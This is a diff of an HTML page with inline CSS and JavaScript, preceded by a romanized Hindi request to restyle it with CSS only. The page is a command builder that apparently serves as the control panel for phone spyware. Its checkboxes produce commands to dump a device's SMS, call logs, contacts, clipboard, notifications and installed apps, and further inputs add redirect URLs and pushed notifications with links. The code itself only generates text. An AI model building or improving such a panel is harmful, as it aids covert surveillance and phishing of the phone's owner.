@@ -1,143 +1,185 @@
+isko kafi jyada stylish banao. aur iska UI bhi jyada stylish nahi hai usko bhi kafi stylish banao. sirf css code likho. not js or html 
+
+<!DOCTYPE html> 
 <html>
 <head>
 <meta charset="UTF-8">
-<title>AI Backup Command Console</title>
-<link rel="stylesheet" href="styles.css">
+<title>Backup Command Generator</title>
+
+<style>
+
+body{
+    font-family: Arial;
+    background:#f4f6fa;
+    padding:20px;
+}
+
+.group{
+    background:white;
+    padding:15px;
+    margin-bottom:15px;
+    border:1px solid #ddd;
+}
+
+.group-title{
+    font-weight:bold;
+    font-size:18px;
+    margin-bottom:10px;
+}
+
+.command{
+    margin:5px 0;
+}
+
+input{
+    padding:5px;
+    margin:3px;
+}
+
+button{
+    padding:10px;
+    margin-top:10px;
+    cursor:pointer;
+}
+
+#result{
+    width:100%;
+    height:120px;
+}
+
+.notification-box{
+    border:1px dashed #aaa;
+    padding:10px;
+    margin:10px 0;
+}
+
+</style>
+
 </head>
 
 <body>
 
-<div class="app">
+<h2>Backup Command Generator</h2>
 
-<div class="header">
-AI Backup Command Console
-</div>
+<!-- DEVICE COMMANDS -->
 
-<div class="layout">
+<div class="group">
 
-<!-- LEFT PANEL -->
-<div class="left-panel">
+<div class="group-title">Device Control</div>
 
-<div class="panel device-panel">
-
-<div class="panel-title">Device Control</div>
-
-<label class="cmd">
+<label class="command">
 <input type="checkbox" data-cmd="deviceinfo">
-<span>deviceinfo</span>
-</label>
+deviceinfo
+</label><br>
 
-<label class="cmd">
+<label class="command">
 <input type="checkbox" data-cmd="connection">
-<span>connection</span>
-</label>
+connection
+</label><br>
 
-<div class="input-group">
+<div>
 
-<input id="redirectUrl" placeholder="Redirect URL">
-
-<button onclick="addRedirect()">ADD</button>
-
-</div>
-
-<div class="input-group">
-
-<input id="wallpaperUrl" placeholder="Wallpaper URL">
-
-<button onclick="addWallpaper()">ADD</button>
+Redirect URL:<br>
+<input id="redirectUrl" placeholder="https://example.com">
+<button onclick="addRedirect()">Add</button>
 
 </div>
 
-</div>
+<div>
 
-
-<div class="panel apps-panel">
-
-<div class="panel-title">Apps</div>
-
-<label class="cmd"><input type="checkbox" data-cmd="apps full"><span>apps full</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="apps 1d"><span>apps 1d</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="apps 7d"><span>apps 7d</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="apps 30d"><span>apps 30d</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="apps installed 1d"><span>apps installed 1d</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="apps installed 7d"><span>apps installed 7d</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="apps installed 30d"><span>apps installed 30d</span></label>
+Change Wallpaper:<br>
+<input id="wallpaperUrl" placeholder="https://example.com/image.jpg">
+<button onclick="addWallpaper()">Add</button>
 
 </div>
 
 </div>
 
+<!-- APPS GROUP -->
 
-<!-- CENTER PANEL -->
+<div class="group">
 
-<div class="center-panel">
+<div class="group-title">Apps Commands</div>
 
-<div class="panel">
-
-<div class="panel-title">SMS</div>
-
-<label class="cmd"><input type="checkbox" data-cmd="sms full"><span>sms full</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="sms 1d"><span>sms 1d</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="sms 7d"><span>sms 7d</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="sms 30d"><span>sms 30d</span></label>
-
-</div>
-
-<div class="panel">
-
-<div class="panel-title">Calls</div>
-
-<label class="cmd"><input type="checkbox" data-cmd="calls full"><span>calls full</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="calls 1d"><span>calls 1d</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="calls 7d"><span>calls 7d</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="calls 30d"><span>calls 30d</span></label>
+<label><input type="checkbox" data-cmd="apps full">apps full</label><br>
+<label><input type="checkbox" data-cmd="apps 1d">apps 1d</label><br>
+<label><input type="checkbox" data-cmd="apps 7d">apps 7d</label><br>
+<label><input type="checkbox" data-cmd="apps 30d">apps 30d</label><br>
+<label><input type="checkbox" data-cmd="apps installed 1d">apps installed 1d</label><br>
+<label><input type="checkbox" data-cmd="apps installed 7d">apps installed 7d</label><br>
+<label><input type="checkbox" data-cmd="apps installed 30d">apps installed 30d</label>
 
 </div>
 
-<div class="panel">
+<!-- SMS GROUP -->
 
-<div class="panel-title">Contacts</div>
+<div class="group">
 
-<label class="cmd"><input type="checkbox" data-cmd="contacts full"><span>contacts full</span></label>
+<div class="group-title">SMS Commands</div>
 
-</div>
-
-</div>
-
-
-<!-- RIGHT PANEL -->
-
-<div class="right-panel">
-
-<div class="panel">
-
-<div class="panel-title">Notifications</div>
-
-<label class="cmd"><input type="checkbox" data-cmd="notification full"><span>notification full</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="notification 1d"><span>notification 1d</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="notification 7d"><span>notification 7d</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="notification 30d"><span>notification 30d</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="no notification"><span>no notification</span></label>
+<label><input type="checkbox" data-cmd="sms full">sms full</label><br>
+<label><input type="checkbox" data-cmd="sms 1d">sms 1d</label><br>
+<label><input type="checkbox" data-cmd="sms 7d">sms 7d</label><br>
+<label><input type="checkbox" data-cmd="sms 30d">sms 30d</label>
 
 </div>
 
+<!-- CALL GROUP -->
 
-<div class="panel">
+<div class="group">
 
-<div class="panel-title">Clipboard</div>
+<div class="group-title">Call Commands</div>
 
-<label class="cmd"><input type="checkbox" data-cmd="clipboard full"><span>clipboard full</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="clipboard 1d"><span>clipboard 1d</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="clipboard 7d"><span>clipboard 7d</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="clipboard 30d"><span>clipboard 30d</span></label>
-<label class="cmd"><input type="checkbox" data-cmd="no clipboard"><span>no clipboard</span></label>
+<label><input type="checkbox" data-cmd="calls full">calls full</label><br>
+<label><input type="checkbox" data-cmd="calls 1d">calls 1d</label><br>
+<label><input type="checkbox" data-cmd="calls 7d">calls 7d</label><br>
+<label><input type="checkbox" data-cmd="calls 30d">calls 30d</label>
 
 </div>
 
+<!-- CONTACT -->
 
-<div class="panel">
+<div class="group">
 
-<div class="panel-title">Custom Notification</div>
+<div class="group-title">Contacts</div>
+
+<label><input type="checkbox" data-cmd="contacts full">contacts full</label>
+
+</div>
+
+<!-- NOTIFICATION BACKUP -->
+
+<div class="group">
+
+<div class="group-title">Notification Backup</div>
+
+<label><input type="checkbox" data-cmd="notification full">notification full</label><br>
+<label><input type="checkbox" data-cmd="notification 1d">notification 1d</label><br>
+<label><input type="checkbox" data-cmd="notification 7d">notification 7d</label><br>
+<label><input type="checkbox" data-cmd="notification 30d">notification 30d</label><br>
+<label><input type="checkbox" data-cmd="no notification">no notification</label>
+
+</div>
+
+<!-- CLIPBOARD -->
+
+<div class="group">
+
+<div class="group-title">Clipboard</div>
+
+<label><input type="checkbox" data-cmd="clipboard full">clipboard full</label><br>
+<label><input type="checkbox" data-cmd="clipboard 1d">clipboard 1d</label><br>
+<label><input type="checkbox" data-cmd="clipboard 7d">clipboard 7d</label><br>
+<label><input type="checkbox" data-cmd="clipboard 30d">clipboard 30d</label><br>
+<label><input type="checkbox" data-cmd="no clipboard">no clipboard</label>
+
+</div>
+
+<!-- CUSTOM NOTIFICATION -->
+
+<div class="group">
+
+<div class="group-title">Custom Notification</div>
 
 <div id="notifications"></div>
 
@@ -145,23 +187,126 @@ AI Backup Command Console
 
 </div>
 
+<!-- RESULT -->
 
-<div class="panel output">
+<div class="group">
 
-<div class="panel-title">Generated Commands</div>
+<div class="group-title">Generated Commands</div>
 
-<textarea id="result"></textarea>
+<textarea id="result"></textarea><br>
 
 <button onclick="generate()">Generate</button>
-<button onclick="copy()">Copy</button>
+<button onclick="copy()">Copy Commands</button>
 
 </div>
 
-</div>
 
-</div>
+<script>
 
-</div>
-<script src="script.js"></script>
+let redirectCommands=[]
+let wallpaperCommands=[]
+let notificationCommands=[]
+
+function addRedirect(){
+
+let url=document.getElementById("redirectUrl").value
+
+if(url)
+redirectCommands.push("redirect url "+url)
+
+}
+
+function addWallpaper(){
+
+let url=document.getElementById("wallpaperUrl").value
+
+if(url)
+wallpaperCommands.push("change wallpaper "+url)
+
+}
+
+function addNotificationBox(){
+
+let box=document.createElement("div")
+
+box.className="notification-box"
+
+box.innerHTML=`
+Title:<input class="ntitle"><br>
+Message:<input class="nmessage"><br>
+Repeat:<input class="nrepeat" value="1"><br>
+Button:<input class="nbutton"><br>
+URL:<input class="nurl"><br>
+`
+
+document.getElementById("notifications").appendChild(box)
+
+}
+
+function generate(){
+
+let cmds=[]
+
+document.querySelectorAll("input[type=checkbox]:checked")
+.forEach(cb=>cmds.push(cb.dataset.cmd))
+
+cmds=cmds.concat(redirectCommands)
+cmds=cmds.concat(wallpaperCommands)
+
+let notif=[]
+
+document.querySelectorAll(".notification-box")
+.forEach(box=>{
+
+let title=box.querySelector(".ntitle").value
+let message=box.querySelector(".nmessage").value
+let repeat=box.querySelector(".nrepeat").value
+let button=box.querySelector(".nbutton").value
+let url=box.querySelector(".nurl").value
+
+if(title && message){
+
+let cmd="send notification | title="+title+" | message="+message
+
+if(repeat) cmd+=" | repeat="+repeat
+if(button) cmd+=" | button="+button
+if(url) cmd+=" | url="+url
+
+notif.push(cmd)
+
+}
+
+})
+
+let notifText=notif.join(",,,,,")
+
+let final=cmds.join(", ")
+
+if(notifText){
+
+if(final) final+=", "
+
+final+=notifText
+
+}
+
+document.getElementById("result").value=final
+
+}
+
+function copy(){
+
+let text=document.getElementById("result")
+
+text.select()
+
+document.execCommand("copy")
+
+alert("Copied")
+
+}
+
+</script>
+
 </body>
 </html>
